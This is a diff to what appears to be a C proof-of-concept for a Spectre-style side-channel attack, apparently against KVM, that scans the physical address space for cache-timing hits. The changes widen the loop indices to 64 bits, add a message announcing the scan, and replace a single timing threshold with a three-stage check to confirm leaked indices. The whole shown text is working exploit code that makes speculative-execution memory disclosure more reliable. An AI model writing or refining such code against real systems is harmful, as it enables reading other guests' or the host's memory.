@@ -111,15 +111,19 @@ typedef char kvm_lapic[8];
 //   Base
 //
 size_t find_min(void *buf) {
-  const uint32_t MAX_IDX = 0xffffffff;
+  const uint64_t MAX_IDX = 0xffffffff;
   const int PAGES_IN_BATCH = 256;
   const int ELEMENTS_PER_PAGE = PAGE_SIZE / sizeof(kvm_lapic);
 
   struct time_deque t;
   time_deque_init(&t);
 
-  const int BATCH_SIZE = PAGES_IN_BATCH * ELEMENTS_PER_PAGE;
-  for (int64_t batch = 0; batch < MAX_IDX; batch += BATCH_SIZE) {
+  printf("Attempting to scan the first %lu bytes of the physical "
+         "address space for a half-Spectre hit.\n",
+         (uint64_t)MAX_IDX * 8);
+
+  const uint64_t BATCH_SIZE = PAGES_IN_BATCH * ELEMENTS_PER_PAGE;
+  for (uint64_t batch = 0; batch < MAX_IDX; batch += BATCH_SIZE) {
     struct timespec start_time;
     clock_gettime(CLOCK_MONOTONIC, &start_time);
 
@@ -136,12 +140,15 @@ size_t find_min(void *buf) {
       for (int64_t page = PAGES_IN_BATCH - 1; page >= 0; --page) {
         size_t idx = batch + (ELEMENTS_PER_PAGE * page) + offset;
 
-        size_t time = access_buffer_with_spectre(buf, idx, 1);
+        size_t time = access_buffer_with_spectre(buf, idx, 10);
         if (time < 220) {
-          time = access_buffer_with_spectre(buf, idx, 10000);
-          if (time < CACHE_HIT_THRESHOLD) {
-            printf("\nhit: %lx %ld\n", idx, time);
-            return idx;
+          time = access_buffer_with_spectre(buf, idx, 100);
+          if (time < 200) {
+            time = access_buffer_with_spectre(buf, idx, 1000);
+            if (time < CACHE_HIT_THRESHOLD) {
+              printf("\nHIT!\nidx: %lx\ntime: %ld\n", idx, time);
+              return idx;
+            }
           }
         }
       }
